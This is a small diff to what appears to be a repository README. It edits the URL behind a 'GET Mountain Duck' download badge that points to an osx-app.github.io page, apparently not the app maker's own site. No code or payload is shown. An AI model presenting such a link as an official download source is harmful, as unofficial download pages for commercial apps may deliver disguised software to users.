@@ -7,7 +7,7 @@
 <br>   
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/mountainduck/">  
+<a href="https://osx-app.github.io/.github/mountainduck">  
 <img src="https://img.shields.io/badge/🦆_GET_Mountain_Duck-amber?style=for-the-badge&logo=apple" alt="GET Mountain Duck">  
 </a>  
 </div>  
